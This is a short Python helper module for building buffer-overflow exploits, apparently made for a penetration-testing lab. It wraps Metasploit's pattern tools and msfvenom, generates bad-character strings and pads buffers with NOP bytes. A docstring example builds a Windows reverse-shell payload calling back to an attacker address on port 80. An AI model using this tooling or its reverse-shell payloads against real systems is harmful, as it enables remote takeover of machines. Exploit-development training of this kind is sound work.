import subprocess

def LE_address(value, width = 4):
    return value.to_bytes(width, 'little')

def pattern_create(length):
    args = ['msf-pattern_create', '-l', str(length)]
    proc = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, err = proc.communicate() 
    return output[:-1] # remove ending newline
    
def pattern_offset(pattern, query):
    if type(query) is str:
        query = bytes(query, encoding = 'ascii')
    return pattern.index(query)

def generate_bad_characters(known_bad = []):
    '''
    Usage:
        generate_bad_characters([0x00, 0x0a, 0x0d]) --> a string with all chars from 0x00 to 0x255 except 0x00, 0x0a, and 0x0d
    '''
    return b''.join([bytes([i]) for i in range(0x100) if not (i in known_bad)])

def msfvenom(argument):
    '''
    Usage:
        msfvenom('LHOST=192.168.119.208 LPORT=80 -p windows/shell_reverse_tcp') 
        -->  b'\xfc\xe8\x82\x00\x00\x00`...'
    '''
    if '-f ' in argument:
        raise Exception('do not provide the format argument to msfvenom. raw is provided by default.')
    args = ['msfvenom', '-f', 'raw'] + argument.split(' ')
    proc = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, err = proc.communicate()
    return output

def concatenate(buffers, length = None, pad_byte = b'\x90', pad_replace = '#PAD#'):
    '''
    Usage:
        1.  Simply join an array of buffers together.

            concatenate(['foo', 'bar', 'baz']) 
            --> 'foobarbaz'

        2.  Add padding to an area among the array of buffers 
            to reach a desired total length.

            concatenate(['foo', '#PAD#', 'baz'], 9) 
            --> 'foo\x90\x90\x90baz'
    '''
    if length:
        pad_index = buffers.index(pad_replace)
        pad = pad_byte * (length - sum([len(i) for i in buffers]) + len(pad_replace))
        buffers[pad_index] = pad
        new_length = sum([len(i) for i in buffers])
        if new_length != length:
            raise Exception('The combined buffer has exceeded the maximum length: {} combined length vs {} maximum allowed'.format(new_length, length))
    return b''.join(buffers)
